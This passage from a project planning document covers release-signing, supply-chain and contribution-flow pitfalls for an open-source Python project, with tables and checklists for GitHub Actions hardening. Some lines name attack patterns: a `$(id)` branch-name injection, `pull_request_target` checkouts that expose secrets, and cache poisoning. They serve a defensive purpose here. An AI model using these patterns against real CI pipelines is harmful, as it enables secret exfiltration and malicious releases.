4. **CHANGELOG drift.** The `CHANGELOG.md` describes v0.6.0 with one set of features, the GitHub Release describes a different set (because the maintainer wrote it freshly from memory at release time), the PyPI description has a third version. Downstream users reading any one of these get different facts. The trust chain extends to the human-readable claims, not just the cryptographic ones.
5. **SECURITY.md supported-versions table not updated.** The current `SECURITY.md` (lines 7-12) still lists `v0.3.x` as supported, two minor versions stale. If v0.6.0 ships without updating that table, a security reporter checks "is my v0.5.0 install supported?" and the table says no, even though we'd want to support v0.5.x security fixes for at least one more minor.

**Why it happens:**
- The release process has 6+ steps and the maintainer runs them in sequence under time pressure (the "I want to ship before I lose flow" trap). Any single skipped step produces drift.
- Tag signing has been around for decades; sigstore is recent. The maintainer reaches for the familiar tool for tags and the new tool for artifacts; the two tools have different identity models.
- CHANGELOG drift is just-don't-update-the-doc, the oldest content drift problem in software.

**How to avoid:**
- **Signing identity discipline.** The decision (per PROJECT.md line 42): "Signing identity: GitHub OIDC via sigstore (keyless) preferred over long-lived maintainer keys; lock at requirements time." This file ratifies the lock:
  - **Wheel + sdist:** signed by `sigstore-python` via GitHub Actions OIDC; identity is the workflow path (Pitfall 3).
  - **Git tag:** signed by `gitsign` (sigstore for git) via the same OIDC; identity is the workflow path. NOT GPG. Decision documented in `.planning/decisions/sigstore-keyless.md` so the question does not re-litigate.
  - **GitHub Release notes:** the release workflow creates the Release with `gh release create v0.6.0 --notes-file CHANGELOG-v0.6.0.md` where the notes file is the relevant section of CHANGELOG.md extracted at release time. No hand-written release notes; the CHANGELOG is canonical.
- **The release workflow attaches ALL artifacts together.** The workflow's final step uploads in one call: wheel, sdist, `wheel.sigstore` bundle, `sdist.sigstore` bundle, SBOM (CycloneDX 1.6 JSON), `SBOM.sigstore` bundle, release notes extracted from CHANGELOG.md. If any artifact is missing, the step fails. There is no "signed some things, will sign the rest later" intermediate state.
- **CHANGELOG.md is updated in the PR that introduces the change, not at release time.** This is the [keep-a-changelog](https://keepachangelog.com/en/1.1.0/) discipline. The PR template (Phase 56) has a CHANGELOG entry as a checkbox; the release-gate (Pitfall 8) checks that the CHANGELOG has an `[Unreleased]` section with entries before the release. At release-time, the maintainer renames `[Unreleased]` to `[0.6.0] - 2026-XX-XX`. No write-from-memory.
- **`SECURITY.md` supported-versions is part of the release gate.** `scripts/release_gate.py` checks that `SECURITY.md`'s table includes the version being released as supported. Mismatch = block. The maintainer is forced to acknowledge "v0.6 ships; v0.4 drops out of support; v0.5 stays for one more cycle" as an explicit decision.
- **`scripts/verify_release.py` is the user-facing trust-chain check.** Downstream users run it post-install:
  ```
  python -m horus_os.verify --version 0.6.0
  ```
  The script:
  1. Re-downloads the wheel from PyPI.
  2. Re-fetches the `.sigstore` bundle.
  3. Verifies the signature against the workflow-scoped identity (Pitfall 3).
  4. Re-fetches the SBOM, verifies its signature, diffs against pip list.
  5. Verifies the git tag (via `git verify-tag`) on a fresh clone.
  6. Cross-references the CHANGELOG entry against the GitHub Release notes.
  All five checks pass → green. Any fail → red with a specific remediation. The script is itself shipped with v0.6 and is the canonical "did the trust chain hold?" check.
- **The "release rehearsal" is a documented step in `docs/RELEASE.md`.** Before the actual tag push, the maintainer runs the entire release workflow against a `v0.6.0-rc1` tag on a fork, verifies all artifacts, verifies the verifier passes, then pushes the production tag. The rehearsal catches the "tag signed but bundle missing" class of bug before users see it.

**Warning signs:**
- A `git tag -s` in the release docs that uses `-s` (GPG) instead of gitsign. Stale instruction; update.
- A GitHub Release with the wheel attached but no `.sigstore` bundle. Hard fail at gate time.
- `SECURITY.md` supported-versions table lists a version older than two minors back. Out of date.
- CHANGELOG.md has no `[0.6.0]` section but the release is shipping. Drift.
- A user reports "I verified the tag but I cannot verify the wheel." Trust chain has a gap.
- The maintainer's git config shows a different `user.email` than the OIDC subject. Historical tag re-verification will fail.

**Phase to address:**
**Phase 53 (signing substrate)** lands sigstore for wheels AND gitsign for tags AND the verify_release.py script. **Phase 57 (SECURITY.md refresh)** updates the supported-versions table and locks it as a release-gate input. **Phase 58 (release-gate extension)** wires the all-artifacts-or-fail check and the CHANGELOG-section check. **Phase 60 (gate flip)** runs the release rehearsal before the actual flip. Owner: SIGN-06 (gitsign for tags), SECDISC-01 (SECURITY.md refresh), REL-17 (verify_release.py), REL-18 (release rehearsal).

---

### Pitfall 12: SECURITY.md SLOs the solo maintainer cannot meet; CODEOWNERS that only lists the maintainer is theater

**What goes wrong:**
The current `SECURITY.md` (lines 30-32) commits to "an acknowledgement within 7 days" and "a fix timeline depends on severity; expect a response in the advisory thread within 14 days." For a solo maintainer who is also doing day-job work, the 14-day-response SLO is realistic for severity:critical; it is NOT realistic for severity:medium or severity:low, where the response might genuinely take 6-8 weeks. If a reporter files a severity:medium and gets no response in 14 days, they either (a) escalate publicly (the project's reputation takes a hit), (b) re-file in another channel (the maintainer now juggles two threads), (c) walk away (the vulnerability stays unfixed). The SLO has converted a manageable backlog into a reputation problem.

A v0.6 expansion of SECURITY.md will be tempted to add MORE concrete SLOs: "we publish a fix within 30 days of acknowledgement"; "we coordinate CVE disclosure within 90 days"; "we ship a CVSS score within 7 days." Each of these is what a corporate-OSS team can do; none of these is what one human can sustain.

A sister failure: CODEOWNERS lists `* @Ridou` — the maintainer is the codeowner of everything. Required-reviews-from-codeowner is enabled. The maintainer's OWN PRs cannot self-approve. Either (a) the maintainer clicks "Merge without approval" every time (defeating the audit story), or (b) the maintainer waits for an outside contributor to review every internal PR (impossible since this is solo mode flipping to multi-maintainer just now). CODEOWNERS-as-policy with a single owner is theater; it doesn't add a review gate, it just adds friction.

A third related failure: the disclosure flow promises a private channel ("GitHub Security Advisories") but the maintainer's notification settings are not configured to surface security advisories distinct from regular issues. A real CVE report sits in the email inbox alongside dependabot bumps for 3 days. By the time the maintainer notices, the reporter has assumed silence.

**Why it happens:**
- "Sound professional" pressure (Pitfall 6 repeat). Corporate SECURITY.md files have specific SLOs; the maintainer copies the shape.
- CODEOWNERS is presented as the "right thing" by every GitHub best-practices doc. The single-maintainer case is rarely called out.
- Notification settings are personal config, invisible in code review. The mismatch surfaces only at the first real incident.

**How to avoid:**
- **SECURITY.md SLOs use "aim to" language, not promise language, AND distinguish severity:**
  - "We aim to acknowledge security reports within 7 days." (Not "we will.")
  - "For severity:critical: we aim to ship a fix within 14 days." (Realistic for one human on a critical.)
  - "For severity:high: aim to ship a fix within 30 days."
  - "For severity:medium: aim to ship a fix within 90 days."
  - "For severity:low: no commitment; tracked in the advisory."
  - "These are aspirational targets, not contractual SLAs. We are a solo-maintainer project."
  The severity-tiered breakdown is what the [GitHub Security best-practices guide](https://docs.github.com/en/code-security/security-advisories) actually recommends, and it gives reporters realistic expectations. Severity is assigned by the maintainer using CVSS 3.1 (per the [FIRST CVSS 3.1 spec](https://www.first.org/cvss/v3.1/specification-document)) during initial triage.
- **CODEOWNERS is path-scoped to high-risk paths only.** Not `* @Ridou`. Instead:
  - `/src/horus_os/secrets.py @Ridou` (secrets handling — review required even for the maintainer's own PRs)
  - `/.github/workflows/ @Ridou` (CI changes — review required, per Pitfall 1)
  - `/scripts/release_gate.py @Ridou` (release gate — review required)
  - `/SECURITY.md @Ridou` (security policy — review required)
  Everything else has no codeowner, can land with normal branch protection. The high-risk paths force a "I am reviewing my own change with intention" check, AND if a future co-maintainer joins, the review gates already exist.
- **GitHub Security Advisories notifications are configured AND tested.** `docs/MAINTAINER-SETUP.md` (a private-ish doc, in the repo but not promoted) documents: GitHub email notifications enabled for `Security advisories` (separate from PR notifications); a "TEST: please ignore" advisory is filed at setup time and the maintainer verifies the notification arrives within an hour. The test advisory is deleted after the check passes. The notification routing is checked annually (re-test) as a release-gate-adjacent item.
- **The advisory triage cadence is part of `docs/TRIAGE.md`.** New security advisories are triaged WITHIN the weekly Sunday session, regardless of other queue depth. Security advisories never wait for "next week."
- **Public disclosure timeline follows [a coordinated 90-day window](https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html) by default, with explicit shorter windows for in-the-wild exploits.** This is documented in SECURITY.md so reporters know the public-disclosure timer. A 90-day window is what the maintainer can plausibly hit; shorter windows are case-by-case.
- **The maintainer can also acknowledge "I am over capacity."** SECURITY.md documents: if the maintainer is unable to meet the aspirational SLO due to bandwidth, the advisory thread gets an explicit "I am unable to address this within 30 days; you are free to publish at the end of the [coordinated window] if no fix is in progress" comment. This is the honest version of the silent-treatment path and gives the reporter a real choice.

**Warning signs:**
- SECURITY.md contains "within 24 hours" or "we will respond within X days" without "aim to" softening. Edit.
- CODEOWNERS contains `* @Ridou`. Scope it down.
- A test security advisory was never filed at setup. Notification routing is unverified.
- A security advisory has gone >7 days without acknowledgement. The aspirational SLO has slipped; document.
- The advisory triage was skipped in the weekly Sunday session. Hard pattern break.
- The `coordinated-disclosure-window-expired` label appears on a real advisory and the maintainer didn't communicate. Either fix or explicitly hand off; do not go silent.

**Phase to address:**
**Phase 57 (SECURITY.md refresh + disclosure flow)** rewrites the SLO language with severity tiers, the coordinated-disclosure default, the "over-capacity acknowledgement" pattern. **Phase 56 (contributor docs)** scopes CODEOWNERS to high-risk paths only. The maintainer-setup documentation (`docs/MAINTAINER-SETUP.md`) and the test-advisory ritual land in Phase 57. Owner: SECDISC-02 (SLO refresh), SECDISC-03 (severity tiers), CONTRIB-05 (CODEOWNERS scoping), SECDISC-04 (maintainer setup doc and test-advisory ritual). The SLO refresh and the CODEOWNERS scoping MUST land before the gate flip; flipping the gate with an over-promised SECURITY.md is the trap that becomes a public reputation problem the first time a reporter waits.

---

## Technical Debt Patterns

Shortcuts that look reasonable but compound. v0.6-specific only; v0.5 patterns are out of scope here.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Allow `pull_request_target` + checkout PR head without label gate | "It just works for fork PRs" | First malicious PR exfiltrates every secret; mandatory secret rotation + audit; CVE disclosure (Ultralytics 8.3.41-46 shape) | **Never.** Per Pitfall 1. The `safe-to-test` label gate or the `pull_request` / `workflow_run` split is the only pattern. |
| Pin actions to `@v4` instead of 40-char SHA | One-line change vs SHA-pin tooling | Mutable tags → action compromise (tj-actions/changed-files CVE-2025-30066 shape) cascades to every workflow | **Never.** Per Pitfall 2. SHA pin with trailing-comment tag for readability. |
| Long-lived `PYPI_API_TOKEN` secret | 1-minute setup vs Trusted Publishing | Token leak = malicious release with legitimate-looking signature; Ultralytics second-wave shape | **Never** after v0.6.0. Trusted Publishing is the only path. |
| `cosign sign-blob` for Python wheels | "Sigstore is sigstore" | Bundle format mismatch with PEP 740 / pip verify; downstream tools cannot consume; signature is decorative | **Never.** Use `sigstore-python` for wheels/sdists; cosign is for containers. |
| Wildcard / regex identity in sigstore verify | "Easier than pinning the exact workflow path" | Attacker workflow on attacker's fork produces a passing signature; identity assertion is half-checked | **Never.** Exact match on workflow path; explicit issuer; per Pitfall 3. |
| `pip freeze` of a dev venv as the SBOM | Quick to wire up | SBOM lists pytest, ruff, mypy as "production deps"; downstream pip-audit scans inflate; SBOM-vs-wheel diff fails | **Never.** SBOM generated against the installed-from-wheel venv only. |
| CycloneDX 1.3 XML instead of 1.6 JSON | "First tutorial showed it" | PEP 740 attestation cannot consume; downstream tooling rejects | **Never.** CycloneDX 1.6 JSON is the lock. |
| pip-audit ignored vulnerabilities without justification comment | Quickly unblock release | Ignore list becomes a "we don't actually look" backdoor; real CVE goes unactioned | **Never.** Every ignore needs a dated `#` comment with a reason and a re-evaluate-by-date. |
| Dependabot security-updates grouped with routine bumps | Less PR noise | CVE fix hidden in "weekly minor bump" PR; merged-stale or not merged at all | **Never.** Security-updates are individual PRs with a distinct label; per Pitfall 5. |
| Mandatory CLA on top of Apache 2.0 | "Sounds professional" | Slows first-time contributors; legal overhead; minimal protection beyond what Apache 2.0 already grants | **Never** for v0.6. DCO with `Signed-off-by:` is the lighter-weight optional fallback. |
| Mandatory Slack/Discord join in CONTRIBUTING.md | Easier community moderation | Excludes async-preference contributors; side-channel decisions; off-record discussion drift | **Never** as a mandate. Discord may exist; canonical channel is GitHub Discussions. |
| 24h response SLA in CONTRIBUTING.md | Sounds responsive | Solo maintainer cannot sustain; first missed SLA becomes a public reputation problem | **Never.** "Aim to acknowledge within 7 days" is honest; per Pitfall 6. |
| `actions/stale` auto-close at 60+30 days | Issue tracker looks cleaner | Real bugs disappear; first-time-contributor `good-first-issue` links to closed issues; user trust erodes | **Never** by default. Manual triage discipline only; per Pitfall 7. |
| `good-first-issue` label on cross-subsystem issues | Looks beginner-friendly | First-time contributor sinks 8 hours, opens wrong-shape PR, gives up; label calibration is broken | **Never.** Issues must satisfy the rubric in `docs/TRIAGE.md`. |
| Every CI check run on every PR including network-dependent gate | "Catch everything before merge" | 52s+ gate on docs-only PRs; flaky-network retries; "retry until green" anti-pattern | **Never.** Two-tier gate; pre-merge is local-only, pre-release is network. |
| Hand-written GitHub Release notes (not extracted from CHANGELOG.md) | Maintainer narrative control | Release notes / CHANGELOG / PyPI description drift; downstream truth depends on which one they read | **Never.** CHANGELOG is canonical; release workflow extracts. |
| CODEOWNERS as `* @maintainer` | "Reviews enforced" | Maintainer's own PRs blocked OR "Merge without approval" clicked every time; audit story breaks | **Never.** Path-scope to high-risk paths only; per Pitfall 12. |
| Promising "fix within 30 days" SLO on every advisory severity | Sounds responsible | Bandwidth runs out; missed SLOs become public reputation; reporter walks | **Never.** Severity-tiered "aim to" language only; per Pitfall 12. |
| Flipping the gate without a documented rollback PR | "We're committed" | First-week overload → no exit plan → maintainer burns out → gate stays open by inertia | **Never.** Single-commit rollback ready before the flip; per Pitfall 10. |
| GPG key for git tag signing | "Familiar tool" | Long-lived key; key leak = forged tags; no workflow-scoped identity assertion | **Never** by default. gitsign with OIDC is the lock; per Pitfall 11. |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| `actions/checkout` under `pull_request_target` | `ref: ${{ github.event.pull_request.head.sha }}` runs attacker code with secrets | Default ref (base); secrets-needing jobs use `workflow_run` or `safe-to-test` label gate with auto-label-strip on push |
| `sigstore-python` verify | `--cert-identity` with a trailing `/*` or no issuer | Exact-match workflow path; `--cert-oidc-issuer https://token.actions.githubusercontent.com` mandatory |
| `cyclonedx-py` SBOM generation | `cyclonedx-py requirements -r requirements.txt` — only direct deps | `cyclonedx-py environment` against a fresh `pip install <wheel>` venv; transitive deps included |
| `pypa/gh-action-pypi-publish` | <v1.11.0 (no auto-attestation) or unscoped `id-token` | ≥v1.11.0 pinned by SHA; `permissions: { id-token: write }` scoped to the publish job only |
| `pip-audit` | Default `-s pypi` only; misses OSV-flagged-not-yet-in-PyPA-db | Dual-run: `-s osv` AND `-s pypi`; differences surfaced in CI logs |
| Dependabot security-updates | Grouped with routine bumps | `applies-to: version-updates` on groups; security PRs un-grouped by config |
| `gitsign` (or `git tag -s`) for tags | GPG key, long-lived | gitsign with GitHub OIDC; workflow-scoped identity; tag verification cross-checks the OIDC subject |
| GitHub Actions `permissions:` | Default `write-all` repo-wide | `permissions: read-all` top-level; jobs explicitly elevate (`contents: write` for publish, `id-token: write` for OIDC) |
| GitHub Release artifact upload | Manual upload after publish | `gh release create` in workflow with all artifacts attached atomically; signature bundles required alongside wheel/sdist |
| `actions/stale` | Configured with 60+30 day timer | Not configured by default; manual triage only; per Pitfall 7 |
| CODEOWNERS | `* @maintainer` (single user) | Path-scoped to high-risk paths only (workflows, secrets handling, release gate, security policy) |
| GitHub Security Advisories | Default email routing | Explicit notification config; test advisory at setup; annual re-test |
| `actionlint` / workflow YAML lint | Run locally only | Wired into `scripts/release_gate.py`; runs on every PR; SHA-pin lint AND `pull_request_target` audit are CI gates |
| Fulcio root cert | Always-fetched at verify | Pinned in `scripts/fulcio-root.pem`; refreshed at each release; offline-fallback verify mode uses pinned cert |
| OSV / PyPA advisory db | Single-source assumption | Both consulted in parallel; tracking-file pattern for known false positives or unfixable transitives |

## Performance Traps

CI cycle time and maintainer-bandwidth budgets. Solo-maintainer-sized; not large-org-sized.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| All release-gate checks run on every PR | Docs-only PR takes 60s+ CI; "retry until green" pattern emerges | Two-tier gate: pre-merge local (<10s), pre-release network (~60s, on release branches only) | After ~3rd new gate check is added; the threshold for retry-without-thinking is ~30s |
| sigstore verify on every PR (without caching) | Adds ~2s per PR for a network round-trip; flakes on Fulcio rotation | Verify ONLY on release branches; pre-merge checks file presence only | Always; the network dependency on a pre-merge gate is the regression |
| pip-audit run synchronously in the test workflow | Slow tests get slower; pip-audit retries on flaky network | Separate `supply-chain.yml` workflow run in parallel; non-blocking on PR-blocking checks (still required, but doesn't sequence behind tests) | After ~3rd added dep, pip-audit runtime exceeds the unit-test runtime |
| SBOM-matches-wheel check on every PR | 20s+ per PR for fresh venv + pip install | Move to pre-release tier; pre-merge checks SBOM presence only | Always; this is too slow for the inner loop |
| Dependabot opens PR per dep per week | 20+ PRs/week; signal lost in noise | Group by `(dependency-type, update-types)`; security-updates explicitly un-grouped | Past ~10 deps; without grouping the queue is unmanageable |
| GitHub Actions matrix expands per OS per Python per gate | 3 OS × 2 Python × 5 gates = 30 jobs per PR | Matrix only on the heaviest checks (install-smoke); supply-chain runs once per PR; sign-verify runs once per release | Past ~10 jobs per PR, the queue waits compound |
| Workflow timeout-minutes unset | Hung step (network, infinite loop) consumes 6h budget | `timeout-minutes:` on every job; sign step ≤5min (OIDC TTL); test step ≤30min | Hangs accumulate silently until the org's monthly minutes are exhausted |
| Issue triage cadence is "when I feel like it" | Backlog accumulates → burnout → gate freeze | Weekly Sunday triage, time-boxed 2-3 hours; skipped week documented in Discussion | After ~30 days post-flip if cadence not enforced; per Pitfall 10's POSTFLIP-PLAYBOOK |
| `actions/cache` on a key derived from user input | Cache poisoning: attacker injects entry into cache used by maintainer workflows | Cache keys derived from in-repo files only (`hashFiles('**/requirements.txt')`); never from `${{ github.event.* }}` strings | First fork PR that touches a cached path with a malicious file |

## Security Mistakes

v0.6-specific. The v0.5 plugin-system security pitfalls are not duplicated here.

| Mistake | Risk | Prevention |
|---------|------|------------|
| `pull_request_target` + `actions/checkout` with PR head ref | Secrets exfiltration on first malicious fork PR (Ultralytics, Spotipy GHSA, testedbefore campaign) | `safe-to-test` label gate with auto-strip on push; OR split to `pull_request` + `workflow_run` |
| Mutable git tag pin (`@v4`) on third-party actions | Action compromise (tj-actions CVE-2025-30066) cascades; 23,000 repos affected at once | 40-char SHA pin with trailing-comment tag; Dependabot for SHA refresh; release-gate lint |
| Long-lived `PYPI_API_TOKEN` | Token leak = malicious release (Ultralytics second wave) | PyPI Trusted Publishing (PEP 807) via OIDC; no long-lived token exists |
| sigstore verification with wildcard identity | Attacker's workflow produces signature that passes verification | Exact-match `--cert-identity` workflow path; `--cert-oidc-issuer` mandatory; negative test asserts wrong identity REJECTS |
| Bundle vs detached signature mismatch | Bundle expected; `.sig` produced; downstream tools reject | `.sigstore` bundle format only; lint that any `.sig` in `dist/` blocks the release |
| SBOM signed but content does not match published wheel | "We attest to one binary, we shipped another" | Release-gate re-downloads PyPI wheel and diffs against SBOM; mismatch = block |
| pip-audit ignored without re-evaluation date | Ignore list silently grows; CVE flagged for ignored dep is missed | Every ignore line has `# YYYY-MM-DD reason — re-evaluate by YYYY-MM-DD`; lint rejects lines without the format |
| Dependabot CVE PR grouped into routine weekly bump | Security fix not visible; maintainer defers; CVE stays unpatched | `applies-to: version-updates` on groups; security-updates always individual PRs; `security-update` label |
| GitHub Actions `permissions: write-all` (or unset, which defaults to broad) | Lateral movement from one workflow compromise to repo-wide impact | `permissions: read-all` top-level; jobs scope up to specific writes only |
| Workflow uses `${{ github.event.* }}` interpolation in `run:` shell | Branch-name code injection (Ultralytics `$(id)` trick) | Pass via `env:` to a shell variable; never interpolate context strings directly into `run:` |
| `id-token: write` at workflow level | Any job can mint an OIDC token; one compromised job can publish | `id-token: write` on the publish job only; other jobs unprivileged |
| Tag signed by GPG with long-lived key | Key leak = forged tag from a real-looking identity | gitsign with OIDC; identity is the workflow path; key is ephemeral |
| Public issue created for a security report | Vulnerability disclosed before fix | SECURITY.md prominently links private disclosure channel; issue templates redirect security to advisory; "needs-security-channel" label auto-applied on issues matching `[security]` keyword |
| Maintainer's GitHub email differs from signed-tag identity | Historical tag verification fails after email rotation | gitsign workflow-scoped identity (not email-scoped); email rotation is irrelevant |
| Cache key derived from PR title or branch name | Attacker poisons cache for subsequent workflow runs | Cache keys from in-repo file hashes only; never from `github.event.*` strings |

## UX Pitfalls

Contribution-flow UX specific to the v0.6 flip.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| CONTRIBUTING.md promises "24h response" | First missed SLA → user posts publicly about unresponsive project | "Aim to acknowledge within 7 days" — honest and sustainable |
| CONTRIBUTING.md requires CLA sign before PR review | First-time contributor abandons | No CLA on Apache 2.0; DCO with `Signed-off-by:` available as optional |
| CONTRIBUTING.md requires Discord join | Async-preference contributors excluded; off-record decisions | Discord optional; GitHub Discussions canonical |
| Issue template fields too rigid (mandatory CVSS, mandatory CVE proposal) | Reporters give up before filing | Required fields = version/OS/Python/reproduce only; severity/CVSS is the maintainer's job to assign during triage |
| `good-first-issue` on cross-subsystem bugs | First-time contributor sinks hours into a too-hard issue | Rubric in `docs/TRIAGE.md`: one-file change, no cross-subsystem knowledge, acceptance checklist in issue body |
| Stale-bot closes a real bug | User trust erodes; same bug re-filed years later | No auto-close stale-bot; manual triage discipline |
| PR template has 20 checkboxes | First-time contributor frustrated, drops PR mid-flow | 5-7 checkboxes maximum: tests added, docs updated, CHANGELOG entry, license OK, ran 3-OS gate locally |
| `accepted-for-review` label gate not documented in PR template | Contributor expects immediate CI; sees no checks running; confused | PR template explicitly mentions: "your PR awaits the `accepted-for-review` label before full CI; this is a 30-day post-flip throttle and will be removed once volume is known" |
| Release notes drift from CHANGELOG | Downstream user reads wrong narrative; PyPI / GitHub Release / CHANGELOG diverge | Release workflow extracts notes from CHANGELOG; never hand-written |
| SECURITY.md disclosure flow buried | Reporter files public issue out of frustration | SECURITY.md prominently linked from README, issue templates, and the GitHub Security Policy tab |
| First-week PR queue depth not communicated | Contributor feels ignored | Pinned Discussion shows current queue depth; SLA expectations re-stated weekly |
| Postflip-playbook freeze not announced | Contributors confused when gate suddenly closes | Freeze announced in pinned Discussion with reason; reopen announced same way |
| `verify_release.py` only documented in `docs/RELEASE.md` (which users don't read) | Trust-chain is verifiable but no user does it | README's install section includes `verify_release.py` as the post-install recommended check |
| The Discord/Slack server (if it exists) is "where the cool kids decide things" | Async contributors second-class | Decisions made in chat get summarized to a Discussion before action; documented as the rule |

## "Looks Done But Isn't" Checklist

Contribution-gate completeness verification. Use during execution.

- [ ] **`pull_request_target` audit:** No workflow uses it without a `safe-to-test` label gate AND a label-auto-strip on new pushes (Pitfall 1).
- [ ] **`actions/checkout` audit:** No workflow checks out `pull_request.head.sha` from a `pull_request_target` trigger without the label gate (Pitfall 1).
- [ ] **Workflow `permissions:` audit:** Every workflow has `permissions: read-all` top-level; explicit elevation only on the jobs that need it (Pitfall 1).
- [ ] **SHA pin audit:** Every third-party action `uses:` line is pinned to a 40-char SHA with trailing tag comment; no `@v4`-style pins; no `@main` pins (Pitfall 2).
- [ ] **Dependabot github-actions ecosystem enabled:** `dependabot.yml` includes `package-ecosystem: github-actions` with `interval: weekly` (Pitfall 2).
- [ ] **Pin freshness check:** Release-gate warns on action SHAs older than 90 days with newer upstream releases (Pitfall 2).
- [ ] **Signing identity locked:** `.planning/decisions/sigstore-keyless.md` exists; workflow-scoped identity constant in `scripts/verify_release.py`; no GPG keys in the signing path (Pitfall 3).
- [ ] **Sign step ordering:** `release.yml` has build → sign → verify → publish, with the sign step within 5 minutes of OIDC token mint (Pitfall 3).
- [ ] **Bundle format:** All artifacts ship `.sigstore` bundles, not `.sig` detached signatures; release-gate rejects `.sig` in `dist/` (Pitfall 3).
- [ ] **PEP 740 attestation visible:** `pip install horus-os==0.6.0` with verbose shows attestation verification (post-pip-25.x) (Pitfall 9).
- [ ] **Verification negative test:** `tests/test_release_verification.py` REJECTS a fixture signed under a wrong identity (Pitfall 3).
- [ ] **SBOM source:** SBOM is generated against `pip install <wheel>` in a fresh venv, not `pip freeze` of the dev venv (Pitfall 4).
- [ ] **SBOM format:** CycloneDX 1.6 JSON; lock documented in `.planning/decisions/sbom-cyclonedx.md` (Pitfall 4).
- [ ] **SBOM-matches-wheel diff:** Release-gate downloads the published wheel and diffs against the SBOM; mismatch blocks (Pitfall 4).
- [ ] **Two SBOMs:** Clean install and `[dev,otel]` install both generated, both signed (Pitfall 4).
- [ ] **Transitive coverage test:** `tests/test_sbom_transitive.py` asserts transitive deps appear in the SBOM (Pitfall 4).
- [ ] **pip-audit dual-run:** Workflow runs both `-s osv` and `-s pypi`; differences are logged (Pitfall 5).
- [ ] **`.github/pip-audit-ignore.txt` discipline:** Every ignore line has `# YYYY-MM-DD reason — re-evaluate by YYYY-MM-DD`; lint enforces format (Pitfall 5).
- [ ] **Tracking-file pattern:** `.github/pip-audit-tracking/` has files for known un-patched transitives; files older than 30 days fail the release-gate (Pitfall 5).
- [ ] **Dependabot security-updates un-grouped:** Routine and dev-dep updates grouped; security-updates explicitly individual PRs with `security-update` label (Pitfall 5).
- [ ] **CONTRIBUTING.md honest SLA:** "Aim to acknowledge within 7 days" — no 24h or 48h promises (Pitfall 6).
- [ ] **No CLA required:** Decision documented in `.planning/decisions/no-cla.md`; DCO available as optional fallback (Pitfall 6).
- [ ] **Discord optional:** CONTRIBUTING.md names GitHub Discussions as canonical; Discord (if it exists) is additive (Pitfall 6).
- [ ] **CODEOWNERS path-scoped:** `* @Ridou` does NOT appear; high-risk paths only (workflows, secrets, release gate, security policy) (Pitfall 12).
- [ ] **`docs/TRIAGE.md` exists** with weekly cadence, label rubric, `good-first-issue` rubric, "maintainer may go silent up to 2 weeks" disclaimer (Pitfall 6, 7).
- [ ] **No `actions/stale`:** Decision documented in `.planning/decisions/no-stale-bot.md` (Pitfall 7).
- [ ] **Label taxonomy ≤15:** Cap enforced via `docs/LABEL-TAXONOMY.md`; release-gate warns on unused labels (Pitfall 7).
- [ ] **`good-first-issue` rubric enforced:** Issue body satisfies the one-file / no-cross-subsystem / acceptance-checklist rubric (Pitfall 7).
- [ ] **Issue templates exist:** Bug, feature, security-redirect, discussion (Pitfall 7).
- [ ] **PR template ≤7 checkboxes:** tests / docs / CHANGELOG / license / 3-OS gate / `accepted-for-review` note / signed commit (if DCO) (Pitfall 7).
- [ ] **Two-tier release gate:** Pre-merge local-only (<10s); pre-release network (~60s) on release branches and tags only (Pitfall 8).
- [ ] **Offline-mode fallback:** Each network check has an `--offline` mode with pinned cached data; never silently skips (Pitfall 8).
- [ ] **Retry-with-cap:** Network checks retry 2-3 times then FAIL with explicit error; never "retry forever" (Pitfall 8).
- [ ] **PyPI Trusted Publishing configured:** PyPI project shows GitHub trust relationship; no `PYPI_API_TOKEN` secret exists; release-gate audits (Pitfall 9).
- [ ] **`pypa/gh-action-pypi-publish@<SHA>` ≥v1.11.0:** PEP 740 attestation publishing enabled by default (Pitfall 9).
- [ ] **`id-token: write` scoped per-job:** Only the publish job has it; other jobs unprivileged (Pitfall 9).
- [ ] **Rollback PR template:** `.planning/rollback/flip-gate-revert.md` exists; one-commit revert of STATUS.md + CONTRIBUTING.md changes (Pitfall 10).
- [ ] **Soft launch in Phase 59:** 3-5 invited contributors filed sample PRs; friction points fixed (Pitfall 10).
- [ ] **`docs/POSTFLIP-PLAYBOOK.md` exists:** Decision matrix for freeze triggers; weekly triage cadence; burnout triggers (Pitfall 10).
- [ ] **`accepted-for-review` label gate in PR template:** First-30-days throttle documented (Pitfall 10).
- [ ] **All artifacts attached atomically:** Wheel + sdist + 2 SBOMs + 4 signature bundles + release notes; `gh release create` in one call (Pitfall 11).
- [ ] **Tag signed by gitsign (OIDC):** Not GPG; workflow-scoped identity (Pitfall 11).
- [ ] **CHANGELOG canonical:** Release notes extracted from CHANGELOG.md; no hand-written notes (Pitfall 11).
- [ ] **`SECURITY.md` supported-versions current:** Includes the version being released; release-gate enforces (Pitfall 11, 12).
- [ ] **`scripts/verify_release.py` ships:** Five-check trust chain (wheel sig, SBOM, tag, CHANGELOG cross-ref, attestation); documented in README (Pitfall 11).
- [ ] **Release rehearsal performed:** `v0.6.0-rc1` dry-run on a fork before production tag push (Pitfall 11).
- [ ] **SECURITY.md SLO language:** "Aim to" with severity tiers; no hard SLAs the maintainer cannot keep (Pitfall 12).
- [ ] **Test security advisory filed and verified:** Notification routing confirmed at maintainer setup; re-test annually (Pitfall 12).
- [ ] **Coordinated disclosure 90-day default:** Documented in SECURITY.md; shorter windows for in-the-wild exploits (Pitfall 12).
- [ ] **"Over-capacity acknowledgement" pattern:** SECURITY.md documents the honest "I cannot address this in 30 days; you may publish" path (Pitfall 12).

## Recovery Strategies

When pitfalls occur despite prevention.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Fork PR exfiltrated secrets via `pull_request_target` | HIGH | Rotate every leaked secret immediately (PyPI, Anthropic, Gemini, OIDC trust relationships); audit workflow run logs since the flip; file GitHub Security Advisory disclosing the exposure; postmortem in `.planning/incidents/`; ship the workflow lint as a hotfix; revert the gate flip via the rollback PR if reputation impact is severe |
| Mutable-tag action compromised (tj-actions-shape) | MEDIUM-HIGH | Immediately stop all workflows (`actions: disable-all` repo setting); audit recent CI run logs for known compromise indicators (base64 strings in logs, unexpected curl/wget); ship SHA-pin lint enforcement as a hotfix; rotate any potentially exposed secrets; resume workflows after audit |
